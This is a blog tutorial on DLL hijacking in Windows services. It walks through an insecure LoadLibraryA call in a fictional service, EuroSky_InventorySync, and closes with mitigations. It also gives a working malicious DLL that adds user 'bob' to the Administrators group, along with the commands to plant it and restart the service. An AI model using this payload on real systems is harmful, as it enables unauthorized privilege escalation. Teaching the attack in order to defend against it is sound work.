---
layout: post
title: "Understanding DLL Hijacking: A Deep Dive into Insecure Library Loading"
date: 2026-03-13
categories: [windows-security]
---



# Understanding DLL Hijacking: A Deep Dive into Insecure Library Loading

In the Windows operating system, Dynamic Link Libraries (DLLs) are essential components that allow multiple applications to share code and resources. However, the way applications load these DLLs can sometimes open the door to a severe security vulnerability known as **DLL Hijacking** (or Insecure Library Loading).

In this tutorial, we will explore how a seemingly harmless coding mistake in a Windows service can lead to local privilege escalation, allowing a standard user to become a system administrator.

## The Core Concept: Windows DLL Search Order

When a Windows application wants to load a DLL but only specifies the name of the file (e.g., `helper.dll`) rather than the full, absolute path (e.g., `C:\App\helper.dll`), the operating system doesn't immediately know where to find it.

To resolve this, Windows relies on a predefined sequence called the **DLL Search Order**. While this order can vary slightly depending on system settings, the standard search order usually begins with:

1.  **The directory from which the application loaded.**
    
2.  The system directory (`C:\Windows\System32`).
    
3.  The 16-bit system directory.
    
4.  The Windows directory (`C:\Windows`).
    
5.  The current working directory.
    
6.  The directories listed in the system's `PATH` environment variable.
    

**The Vulnerability:** If an attacker can place a malicious DLL with the expected name in a directory that is searched _before_ the legitimate DLL's location, the application will load the attacker's code instead.


## Anatomy of a Vulnerable Service

Let's examine a real-world scenario using a custom Windows service named `EuroSky_InventorySync`.

### The Flawed Code

Below is a snippet of the service's C++ code, specifically the function responsible for initializing a plugin:

```c
// Vulnerable function that attempts to load a DLL without specifying a full path.
void InitializeSyncPlugin() {

    const char* pluginPath = "inventory_helper_ext.dll";
    HINSTANCE hPlugin = LoadLibraryA(pluginPath); // <-- THE FLAW

    if (hPlugin != NULL) {
        // DLL loaded successfully, now we search "StartSync" func in it.
        StartSyncFunc pInitPlugin = (StartSyncFunc) GetProcAddress(hPlugin, "StartSync");
        if (pInitPlugin != NULL) {
            pInitPlugin(); // Call the function to start the sync process.
        } else {
            OutputDebugString(_T("EuroSky_InventorySync: StartSync function not found in DLL."));
        }
        FreeLibrary(hPlugin); // Unload the DLL after use.
    } 
    // ... error handling omitted for brevity
}
```

### Why is this vulnerable?

The critical error lies in this line: `LoadLibraryA("inventory_helper_ext.dll");`.

Because the developer used a relative path, the service relies on the Windows DLL Search Order. Since Windows services typically run under the highly privileged `NT AUTHORITY\SYSTEM` account, whatever code is loaded by `LoadLibraryA` will execute with those same maximum privileges.



## The Exploit: Privilege Escalation in Action

For an attacker to exploit this, two conditions must be met:

1.  The service must use an insecure `LoadLibrary` call (which we verified above).
    
2.  The attacker must have write permissions to a directory high up in the DLL Search Order (most commonly, the application's installation directory).
    

### 1. Crafting the Malicious Payload

An attacker can write a custom DLL that exports the exact function the service is looking for (`StartSync`). However, instead of performing an inventory sync, the attacker writes code to escalate their privileges.

Here is an example of what that malicious DLL might look like:

```c++
#include <windows.h>
#include <lm.h>
#include <stdio.h>
#pragma comment(lib, "netapi32.lib")

// The malicious payload
void FileSync() {
    LPCWSTR targetUser = L"bob"; 
    PCWSTR targetGroup = L"Administrators";
    LOCALGROUP_MEMBERS_INFO_3 memberInfo = {0};
    memberInfo.lgrmi3_domainandname = (LPWSTR)targetUser;
    
    // Adds the user 'bob' to the local Administrators group
    NET_API_STATUS status = NetLocalGroupAddMembers(NULL, targetGroup, 3, (LPBYTE)&memberInfo, 1);
}

// Exporting the function the service expects to find
extern "C" __declspec(dllexport) void StartSync() {
    FileSync();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    return TRUE; 
}

```

### 2. Planting the DLL

If the installation directory (`C:\Program Files\EuroSky\bin\`) has weak permissions that allow standard users to write to it, the attacker simply copies their crafted DLL into that folder:



```dos
copy C:\Users\bob\Desktop\inventory_helper_ext.dll "C:\Program Files\EuroSky\bin\"
```

### 3. Triggering the Exploit

To execute the payload, the service needs to be forced to load the DLL. This happens when the service starts. The attacker executes:


```dos
net stop EuroSky_InventorySync
net start EuroSky_InventorySync
```

_(Note: Stopping/starting services usually requires admin rights, but the service might restart automatically on reboot, or crash and auto-restart)._

When the service boots up, it checks its own `bin` directory first. It finds the attacker's `inventory_helper_ext.dll`, loads it into memory as `NT AUTHORITY\SYSTEM`, and executes the `StartSync()` function. Instantly, the standard user "bob" is added to the local Administrators group.



## How to Prevent DLL Hijacking

Securing applications against DLL Hijacking requires strict file path handling and proper system configuration.

### 1. Always Use Absolute Paths

The most effective way to prevent this vulnerability at the code level is to hardcode the absolute path to the DLL.

**Vulnerable:**


```c
HINSTANCE hPlugin = LoadLibraryA("inventory_helper_ext.dll");
```

**Secure:**

```c
HINSTANCE hPlugin = LoadLibraryA("C:\\Program Files\\EuroSky\\bin\\plugins\\inventory_helper_ext.dll");
```

### 2. Restrict Directory Permissions

System administrators must ensure that standard users do not have write access to application directories, especially those residing in `C:\Program Files\` or `C:\Program Files (x86)\`. If an attacker cannot drop a file into the search path, the exploit chain is broken.

### 3. Use Secure API Alternatives

Modern Windows development offers APIs designed to restrict where DLLs can be loaded from. Developers should utilize `SetDefaultDllDirectories` to limit the search path to secure locations (like `System32`) and use `AddDllDirectory` or `LoadLibraryEx` with specific flags (like `LOAD_LIBRARY_SEARCH_APPLICATION_DIR`) to tightly control the loading behavior.

----------

_Understanding how threat actors abuse standard operating system features is the first step in writing resilient, secure software. Always sanitize your inputs, restrict your file paths, and audit your folder permissions._

